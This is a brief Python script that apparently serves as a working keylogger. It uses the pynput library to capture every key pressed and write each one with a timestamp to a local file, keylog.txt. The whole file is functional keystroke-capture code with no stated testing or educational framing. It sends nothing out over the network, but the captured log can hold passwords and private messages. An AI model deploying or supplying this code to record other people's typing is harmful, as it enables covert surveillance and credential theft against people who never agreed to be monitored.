from pynput import keyboard
import logging

# Set up logging to a file
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key))
    except Exception as e:
        logging.error(f"Error: {e}")

# Set up the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
